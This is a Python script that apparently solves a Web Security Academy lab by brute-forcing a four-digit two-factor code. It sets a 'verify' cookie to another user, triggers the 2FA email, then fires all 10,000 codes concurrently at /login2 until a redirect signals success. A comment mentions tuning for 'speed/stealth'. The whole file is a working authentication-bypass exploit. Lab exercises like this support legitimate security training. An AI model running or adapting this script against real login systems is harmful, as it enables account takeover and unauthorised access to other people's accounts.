import asyncio
import aiohttp
import nest_asyncio
import time

nest_asyncio.apply()

BASE_URL = "https://0a780088032bef23802f9931005f006e.web-security-academy.net"
LOGIN2_URL = f"{BASE_URL}/login2"

COOKIES = {
    "verify": "carlos",
    "session": "gsoiA0PcehvVpAqBMqcnr3hD4lkW0yPG"
}

HEADERS = {
    "Host": "0a780088032bef23802f9931005f006e.web-security-academy.net",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Referer": f"{BASE_URL}/login",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": BASE_URL,
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document"
}

CONCURRENT_REQUESTS = 30  # Adjust to tune speed/stealth
found_code = None


async def trigger_code(session):
    async with session.get(LOGIN2_URL, headers=HEADERS, cookies=COOKIES) as resp:
        print(f"[+] Triggered 2FA email. Status: {resp.status}")


async def try_code(session, code):
    global found_code
    if found_code:
        return

    data = {"mfa-code": code}
    try:
        async with session.post(LOGIN2_URL, headers=HEADERS, cookies=COOKIES, data=data, allow_redirects=False) as resp:
            if resp.status == 302:
                print(f"[✓] SUCCESS! Code = {code}")
                found_code = code
            elif int(code) % 100 == 0:
                print(f"[*] Tried {code}")
            await asyncio.sleep(0.05)  # Delay to mimic Burp rate
    except Exception as e:
        print(f"[!] Error on {code}: {e}")


async def worker(session, codes):
    for code in codes:
        if found_code:
            break
        await try_code(session, code)


async def main():
    connector = aiohttp.TCPConnector(limit=CONCURRENT_REQUESTS, force_close=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        await trigger_code(session)
        codes = [f"{i:04d}" for i in range(10000)]
        chunks = [codes[i::CONCURRENT_REQUESTS] for i in range(CONCURRENT_REQUESTS)]
        tasks = [worker(session, chunk) for chunk in chunks]
        await asyncio.gather(*tasks)


if __name__ == "__main__":
    start = time.time()
    asyncio.run(main())
    print(f"Done in {time.time() - start:.2f} seconds.")
